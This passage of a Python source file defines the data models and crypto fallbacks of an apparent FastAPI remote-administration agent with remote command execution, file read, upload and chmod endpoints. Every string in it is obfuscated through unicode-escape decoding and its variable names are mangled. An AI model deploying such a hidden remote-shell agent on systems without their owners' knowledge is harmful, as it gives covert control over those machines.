import codecs
import os
import sys
import json
import time
import base64
import hashlib
import secrets
import threading
from datetime import datetime, timezone
from typing import Union, List, Dict, Any, Optional
from fastapi import FastAPI, Request, Response, HTTPException, status
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware
from urllib.parse import unquote, urlsplit
from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST256p
from ecdsa.util import sigdecode_der, sigdecode_string
import binascii
try:
    from ecies import encrypt as ecies_encrypt
except Exception:
    import hmac as _hmac_mod
    _SECP_P = 115792089237316195423570985008687907853269984665640564039457584007908834671663
    _SECP_N = 115792089237316195423570985008687907852837564279074904382605163141518161494337

    def _secp_decompress_pub(O0_var_1: bytes):
        from ecdsa import SECP256k1, VerifyingKey
        from ecdsa.ellipticcurve import Point
        if len(O0_var_1) == 65 and O0_var_1[0] == 4:
            return VerifyingKey.from_string(O0_var_1[1:], curve=SECP256k1).pubkey.point
        if len(O0_var_1) == 33 and O0_var_1[0] in (2, 3):
            O0_var_2 = int.from_bytes(O0_var_1[1:], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_3 = (pow(O0_var_2, 3, _SECP_P) + 7) % _SECP_P
            O0_var_4 = pow(O0_var_3, (_SECP_P + 1) // 4, _SECP_P)
            if O0_var_4 * O0_var_4 % _SECP_P != O0_var_3:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079', 'unicode_escape'))
            if O0_var_4 & 1 != O0_var_1[0] - 2:
                O0_var_4 = _SECP_P - O0_var_4
            return Point(SECP256k1.curve, O0_var_2, O0_var_4)
        raise ValueError(codecs.decode('\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074', 'unicode_escape'))

    def _secp_point_bytes(O0_var_5) -> bytes:
        return b'\x04' + O0_var_5.x().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_5.y().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))

    def _kisama_hkdf_sha256(O0_var_6: bytes, O0_var_7: int=32) -> bytes:
        O0_var_8 = _hmac_mod.new(b'', O0_var_6, hashlib.sha256).digest()
        O0_var_9 = b''
        O0_var_10 = b''
        O0_var_11 = 1
        while len(O0_var_9) < O0_var_7:
            O0_var_10 = _hmac_mod.new(O0_var_8, O0_var_10 + bytes([O0_var_11]), hashlib.sha256).digest()
            O0_var_9 += O0_var_10
            O0_var_11 += 1
        return O0_var_9[:O0_var_7]

    def _kisama_ecies_encrypt_fallback(O0_var_12: bytes, data: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_13 = _secp_decompress_pub(O0_var_12)
        while True:
            O0_var_14 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < _SECP_N:
                break
        O0_var_15 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_14, curve=SECP256k1).get_verifying_key().to_string()
        O0_var_16 = _secp_point_bytes(O0_var_13 * int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')))
        O0_var_17 = _kisama_hkdf_sha256(O0_var_15 + O0_var_16)
        O0_var_18 = secrets.token_bytes(16)
        O0_var_19 = AESGCM(O0_var_17).encrypt(O0_var_18, data, None)
        return O0_var_15 + O0_var_18 + O0_var_19[-16:] + O0_var_19[:-16]
    ecies_encrypt = _kisama_ecies_encrypt_fallback
import uvicorn
import asyncio
import platform
import psutil
import aiohttp
import socket
import subprocess
import shlex
from fastapi import BackgroundTasks
from croniter import croniter
from collections import deque
from contextlib import asynccontextmanager
from pydantic import BaseModel, Field, RootModel, ConfigDict
from fastapi import Body, Depends, Query
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except Exception:

    def _kisama_get_random_bytes(O0_var_20: int) -> bytes:
        return os.urandom(O0_var_20)

    class _KisamaAESGCMFallback:

        def __init__(self, key: bytes, nonce: bytes):
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM(key)
            self._nonce = nonce

        def encrypt_and_digest(self, O0_var_21: bytes):
            O0_var_22 = self._aesgcm.encrypt(self._nonce, O0_var_21, None)
            return (O0_var_22[:-16], O0_var_22[-16:])

        def decrypt_and_verify(self, O0_var_23: bytes, O0_var_24: bytes) -> bytes:
            return self._aesgcm.decrypt(self._nonce, O0_var_23 + O0_var_24, None)

    class _KisamaAESFallback:
        MODE_GCM = codecs.decode('\\u0067\\u0063\\u006d', 'unicode_escape')

        @staticmethod
        def new(key: bytes, mode, nonce: bytes=None):
            if nonce is None:
                raise ValueError(codecs.decode('\\u517c\\u5bb9\\u57ab\\u7247\\u4ec5\\u652f\\u6301\\u0020\\u0041\\u0045\\u0053\\u002d\\u0047\\u0043\\u004d\\u0020\\u4e14\\u5fc5\\u987b\\u63d0\\u4f9b\\u0020\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
            return _KisamaAESGCMFallback(key, nonce)
    AES = _KisamaAESFallback
    get_random_bytes = _kisama_get_random_bytes
from noise.connection import NoiseConnection, Keypair
from fastapi import WebSocket, WebSocketDisconnect
import shutil
import struct
import select
import signal
if os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape'):
    termios = None
    fcntl = None
    pty = None
else:
    import termios
    import fcntl
    import pty
import http.client
import queue
import ssl
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, asdict
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization
from typing import Tuple

def _resolve_safe_cwd():
    for O0_var_25 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_25 and os.path.isdir(O0_var_25):
            return O0_var_25
    return codecs.decode('\\u002e', 'unicode_escape')

def _resolve_safe_file_root():
    for O0_var_26 in (os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_26 and os.path.isdir(O0_var_26):
            return O0_var_26
        if O0_var_26:
            print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5019\\u9009\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u002c\\u0020\\u5df2\\u8df3\\u8fc7\\u003a\\u0020', 'unicode_escape') + str(O0_var_26))
    print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5168\\u90e8\\u5019\\u9009\\u65e0\\u6548\\u002c\\u0020\\u964d\\u7ea7\\u5230\\u5f53\\u524d\\u5de5\\u4f5c\\u76ee\\u5f55\\u003a\\u0020', 'unicode_escape') + str(os.getcwd()))
    return os.getcwd()

class SResponse(BaseModel):
    codecs.decode('\\u901a\\u7528\\u72b6\\u6001\\u54cd\\u5e94', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')])

class CountResponse(SResponse):
    codecs.decode('\\u5e26\\u8ba1\\u6570\\u7684\\u901a\\u7528\\u54cd\\u5e94', 'unicode_escape')
    count: int = Field(..., examples=[0])

class BaseInfoResponse(BaseModel):
    codecs.decode('\\u4ee3\\u7406\\u57fa\\u7840\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    arch: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u67b6\\u6784', 'unicode_escape'), examples=[codecs.decode('\\u0078\\u0038\\u0036\\u005f\\u0036\\u0034', 'unicode_escape')])
    cpu_cores: int = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u6838\\u5fc3\\u6570', 'unicode_escape'), examples=[4])
    cpu_name: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u0049\\u006e\\u0074\\u0065\\u006c\\u0028\\u0052\\u0029\\u0020\\u0058\\u0065\\u006f\\u006e\\u0028\\u0052\\u0029\\u0020\\u0043\\u0050\\u0055\\u0020\\u0040\\u0020\\u0032\\u002e\\u0032\\u0030\\u0047\\u0048\\u007a', 'unicode_escape')])
    disk_total: int = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u603b\\u5bb9\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[48360738816])
    gpu_name: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u0047\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u0056\\u0049\\u0044\\u0049\\u0041\\u0020\\u0047\\u0065\\u0046\\u006f\\u0072\\u0063\\u0065\\u0020\\u0052\\u0054\\u0058\\u0020\\u0033\\u0030\\u0039\\u0030', 'unicode_escape')])
    ipv4: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0034\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0031\\u0039\\u0032\\u002e\\u0031\\u0036\\u0038\\u002e\\u0031\\u002e\\u0031\\u0030\\u0030', 'unicode_escape')])
    ipv6: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0036\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0030\\u0031\\u003a\\u0064\\u0062\\u0038\\u003a\\u003a\\u0031', 'unicode_escape')])
    mem_total: int = Field(..., description=codecs.decode('\\u5185\\u5b58\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[8589934592])
    os: str = Field(..., description=codecs.decode('\\u64cd\\u4f5c\\u7cfb\\u7edf\\u540d\\u79f0', 'unicode_escape'), examples=[codecs.decode('\\u0055\\u0062\\u0075\\u006e\\u0074\\u0075\\u0020\\u0032\\u0032\\u002e\\u0030\\u0034', 'unicode_escape')])
    kernel_version: str = Field(..., description=codecs.decode('\\u5185\\u6838\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0035\\u002e\\u0031\\u0035\\u002e\\u0030\\u002d\\u0037\\u0036\\u002d\\u0067\\u0065\\u006e\\u0065\\u0072\\u0069\\u0063', 'unicode_escape')])
    swap_total: int = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[0])
    version: str = Field(..., description=codecs.decode('\\u4ee3\\u7406\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0031', 'unicode_escape')])
    virtualization: str = Field(..., description=codecs.decode('\\u865a\\u62df\\u5316\\u73af\\u5883', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')])
    session_key: Optional[bytes] = Field(None, description=codecs.decode('\\u672c\\u6b21\\u4f1a\\u8bdd\\u7684\\u52a8\\u6001\\u0020\\u0041\\u0045\\u0053\\u002d\\u0032\\u0035\\u0036\\u0020\\u5bc6\\u94a5\\u0020\\u0028\\u660e\\u6587\\uff0c\\u7531\\u4e2d\\u95f4\\u4ef6\\u8d1f\\u8d23\\u52a0\\u5bc6\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006b\\u0037\\u0042\\u0076\\u0039\\u002e\\u002e\\u002e\\u0033\\u0032\\u4f4d\\u5bc6\\u94a5\\u5b57\\u7b26\\u4e32\\u6216\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')])
    noise_key: Optional[Dict[str, Any]] = Field(None, description=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u914d\\u7f6e\\uff0c\\u63a5\\u6536\\u4efb\\u610f\\u5b57\\u5178\\u7ed3\\u6784', 'unicode_escape'))

class StatusResponse(BaseModel):
    codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    cpu: Dict[str, float] = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): 12.5}])
    ram: Dict[str, int] = Field(..., description=codecs.decode('\\u5185\\u5b58\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 8589934592, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 4000000000}])
    swap: Dict[str, int] = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}])
    load: Dict[str, float] = Field(..., description=codecs.decode('\\u7cfb\\u7edf\\u8d1f\\u8f7d', 'unicode_escape'), examples=[{codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): 0.5, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): 0.4, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): 0.3}])
    disk: Dict[str, int] = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 48360738816, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 30000000000}])
    network: Dict[str, int] = Field(..., description=codecs.decode('\\u7f51\\u7edc\\u7edf\\u8ba1', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0070', 'unicode_escape'): 1024, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 2048, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): 1000000, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): 2000000}])
    connections: Dict[str, int] = Field(..., description=codecs.decode('\\u8fde\\u63a5\\u6570', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): 20, codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): 5}])
    uptime: int = Field(..., description=codecs.decode('\\u8fd0\\u884c\\u65f6\\u95f4\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[3600])
    process: int = Field(..., description=codecs.decode('\\u8fdb\\u7a0b\\u6570\\u91cf', 'unicode_escape'), examples=[150])
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u9644\\u52a0\\u6d88\\u606f', 'unicode_escape'), examples=[codecs.decode('', 'unicode_escape')])

class ExecResponse(BaseModel):
    result: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u0028\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074\\u002b\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0020\\u0034\\u000a\\u0064\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u002e\\u002e\\u002e', 'unicode_escape')])
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801\\u0020\\u0028\\u0030\\u003d\\u6210\\u529f\\u002c\\u0020\\u0031\\u0032\\u0034\\u003d\\u8d85\\u65f6\\u002c\\u0020\\u0031\\u0032\\u0037\\u003d\\u672a\\u627e\\u5230\\u0029', 'unicode_escape'), examples=[0])
    timeout: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u56e0\\u8d85\\u65f6\\u88ab\\u7ec8\\u6b62', 'unicode_escape'), examples=[False])
    cmd: str = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape')])

class TempKeyEcdsaPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u0050\\u0045\\u004d\\u0020\\u683c\\u5f0f\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0050\\u0045\\u004d\\u002c\\u0020\\u7528\\u4e8e\\u7b7e\\u540d\\u8bf7\\u6c42\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u516c\\u94a5\\u0020\\u0028\\u0050\\u0045\\u004d\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyEciesPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5341\\u516d\\u8fdb\\u5236\\u683c\\u5f0f\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0036\\u0034\\u5b57\\u7b26\\u003d\\u0033\\u0032\\u5b57\\u8282\\u002c\\u0020\\u7528\\u4e8e\\u89e3\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u0065\\u0036\\u0038\\u0064\\u0030\\u0065\\u0063\\u0038\\u0033\\u0065\\u0037\\u0065\\u0061\\u0030\\u0064\\u0034\\u0037\\u0034\\u0033\\u0034\\u0061\\u0035\\u0039\\u0063\\u0034\\u0032\\u0036\\u0035\\u0036\\u0064\\u0033\\u0030\\u0065\\u0036\\u0065\\u0062\\u0065\\u0031\\u0063\\u0039\\u0032\\u0039\\u0037\\u0036\\u0062\\u0035\\u0037\\u0031\\u0038\\u0035\\u0039\\u0063\\u0038\\u0066\\u0063\\u0062\\u0064\\u0064\\u0030\\u0034\\u0038\\u0037\\u0030', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u516c\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0031\\u0033\\u0030\\u5b57\\u7b26\\u003d\\u0036\\u0035\\u5b57\\u8282\\u002c\\u0020\\u4f9b\\u4ee3\\u7406\\u7aef\\u52a0\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u0034\\u0062\\u0063\\u0066\\u0037\\u0031\\u0063\\u0036\\u0037\\u0062\\u0039\\u0066\\u0033\\u0036\\u0037\\u0032\\u0035\\u0066\\u0035\\u0034\\u0063\\u0034\\u0031\\u0066\\u0039\\u0036\\u0035\\u0032\\u0061\\u0063\\u0066\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyResponse(BaseModel):
    codecs.decode('\\u83b7\\u53d6\\u4e34\\u65f6\\u5bc6\\u94a5\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    key_id: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u5bc6\\u94a5\\u6807\\u8bc6', 'unicode_escape'), examples=[codecs.decode('\\u0033\\u0066\\u0039\\u0061\\u0030\\u0062\\u0032\\u0063\\u0034\\u0064\\u0035\\u0065\\u0036\\u0066\\u0037\\u0038', 'unicode_escape')])
    ttl_seconds: int = Field(..., description=codecs.decode('\\u6709\\u6548\\u671f\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[86400])
    created_at: str = Field(..., description=codecs.decode('\\u751f\\u6210\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    expires_at: str = Field(..., description=codecs.decode('\\u8fc7\\u671f\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0039\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    ecdsa: TempKeyEcdsaPair
    ecies: TempKeyEciesPair

class ExecRequestJSON(BaseModel):
    cmd: str = Field(..., description=codecs.decode('\\u8981\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002d\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')])
    cwd: Optional[str] = Field(None, description=codecs.decode('\\u5de5\\u4f5c\\u76ee\\u5f55', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    env: Optional[Dict[str, str]] = Field(None, description=codecs.decode('\\u989d\\u5916\\u73af\\u5883\\u53d8\\u91cf', 'unicode_escape'), examples=[{codecs.decode('\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'): codecs.decode('\\u002f\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'): codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')}])

class FileListRequest(BaseModel):
    path: str = Field(codecs.decode('\\u002e', 'unicode_escape'), description=codecs.decode('\\u8981\\u5217\\u51fa\\u7684\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5217\\u51fa\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class FileInfo(BaseModel):
    name: str
    path: str
    type: str
    size: int
    mtime: str
    mode: str
    mode_octal: str
    owner: str

class FileListResponse(CountResponse):
    files: List[FileInfo]

class AuthorityQueryRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u67e5\\u8be2\\u6743\\u9650\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')]])

class AuthorityInfo(BaseModel):
    path: str
    name: str
    mode: str
    mode_octal: str
    type: str
    readable: bool
    writable: bool
    executable: bool

class AuthorityQueryResponse(SResponse):
    files: List[AuthorityInfo]

class AuthoritySetRequest(BaseModel):
    permissions: Dict[str, str] = Field(..., description=codecs.decode('\\u8def\\u5f84\\u5230\\u6743\\u9650\\u6a21\\u5f0f\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u0036\\u0034\\u0034', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073', 'unicode_escape'): codecs.decode('\\u0037\\u0035\\u0035', 'unicode_escape')}])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5e94\\u7528\\u5230\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class AuthorityResult(BaseModel):
    path: str
    requested: str
    applied: str
    mode_octal: str
    status: str

class AuthoritySetResponse(SResponse):
    total: int
    success: int
    results: List[AuthorityResult]

class FileCatRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u67e5\\u770b\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0079\\u0073\\u006c\\u006f\\u0067', 'unicode_escape')])

class FileCatResponse(SResponse):
    path: str
    content: str
    encoding: str
    is_binary: bool
    size: int

class FileUploadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u4e0a\\u4f20\\u76ee\\u6807\\u76ee\\u5f55\\u6216\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0073', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u0066\\u0069\\u006c\\u0065\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')])
    filename: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u540d\\u0020\\u0028\\u5f53\\u0070\\u0061\\u0074\\u0068\\u662f\\u76ee\\u5f55\\u65f6\\u5fc5\\u586b\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])
    content: str = Field(..., description=codecs.decode('\\u6587\\u4ef6\\u5185\\u5bb9\\u7684\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u7f16\\u7801', 'unicode_escape'), examples=[codecs.decode('\\u0053\\u0047\\u0056\\u0073\\u0062\\u0047\\u0038\\u0067\\u0056\\u0032\\u0039\\u0079\\u0062\\u0047\\u0051\\u0068', 'unicode_escape')])
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5206\\u5757\\u7d22\\u5f15\\u0020\\u0028\\u0030\\u002d\\u0062\\u0061\\u0073\\u0065\\u0064\\u0029', 'unicode_escape'), examples=[0])
    total_chunks: Optional[int] = Field(None, description=codecs.decode('\\u603b\\u5206\\u5757\\u6570', 'unicode_escape'), examples=[3])

class FileUploadRawResponse(SResponse):
